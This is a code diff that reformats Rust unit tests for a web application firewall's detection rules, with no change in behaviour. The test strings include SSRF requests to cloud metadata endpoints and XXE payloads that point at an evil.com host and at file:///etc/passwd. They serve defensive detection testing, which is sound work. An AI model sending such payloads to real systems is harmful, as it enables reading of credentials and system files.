@@ -521,8 +521,12 @@ mod tests {
     fn test_ssrf_cloud_metadata() {
         let rs = RuleSet::default_crs();
         let rule = rs.rules().iter().find(|r| r.id == 934100).unwrap();
-        assert!(rule.pattern.is_match("http://169.254.169.254/latest/meta-data/"));
-        assert!(rule.pattern.is_match("http://metadata.google.internal/computeMetadata/"));
+        assert!(rule
+            .pattern
+            .is_match("http://169.254.169.254/latest/meta-data/"));
+        assert!(rule
+            .pattern
+            .is_match("http://metadata.google.internal/computeMetadata/"));
         assert!(!rule.pattern.is_match("http://example.com/page"));
     }
 
@@ -586,8 +590,12 @@ mod tests {
     fn test_xxe_doctype() {
         let rs = RuleSet::default_crs();
         let rule = rs.rules().iter().find(|r| r.id == 936100).unwrap();
-        assert!(rule.pattern.is_match("<!DOCTYPE foo SYSTEM \"http://evil.com/xxe.dtd\">"));
-        assert!(rule.pattern.is_match("<!DOCTYPE foo PUBLIC \"-//W3C\" \"http://evil.com\">"));
+        assert!(rule
+            .pattern
+            .is_match("<!DOCTYPE foo SYSTEM \"http://evil.com/xxe.dtd\">"));
+        assert!(rule
+            .pattern
+            .is_match("<!DOCTYPE foo PUBLIC \"-//W3C\" \"http://evil.com\">"));
         assert!(!rule.pattern.is_match("<html>normal page</html>"));
     }
 
@@ -595,8 +603,12 @@ mod tests {
     fn test_xxe_entity() {
         let rs = RuleSet::default_crs();
         let rule = rs.rules().iter().find(|r| r.id == 936110).unwrap();
-        assert!(rule.pattern.is_match("<!ENTITY xxe SYSTEM \"file:///etc/passwd\">"));
-        assert!(rule.pattern.is_match("<!ENTITY xxe SYSTEM 'http://evil.com/data'>"));
+        assert!(rule
+            .pattern
+            .is_match("<!ENTITY xxe SYSTEM \"file:///etc/passwd\">"));
+        assert!(rule
+            .pattern
+            .is_match("<!ENTITY xxe SYSTEM 'http://evil.com/data'>"));
         assert!(!rule.pattern.is_match("<entity>normal xml</entity>"));
     }
 
@@ -608,7 +620,10 @@ mod tests {
         assert_eq!(RuleCategory::Xss.as_str(), "xss");
         assert_eq!(RuleCategory::PathTraversal.as_str(), "path_traversal");
         assert_eq!(RuleCategory::CommandInjection.as_str(), "command_injection");
-        assert_eq!(RuleCategory::ProtocolViolation.as_str(), "protocol_violation");
+        assert_eq!(
+            RuleCategory::ProtocolViolation.as_str(),
+            "protocol_violation"
+        );
         assert_eq!(RuleCategory::Ssrf.as_str(), "ssrf");
         assert_eq!(RuleCategory::LogInjection.as_str(), "log_injection");
         assert_eq!(RuleCategory::Xxe.as_str(), "xxe");
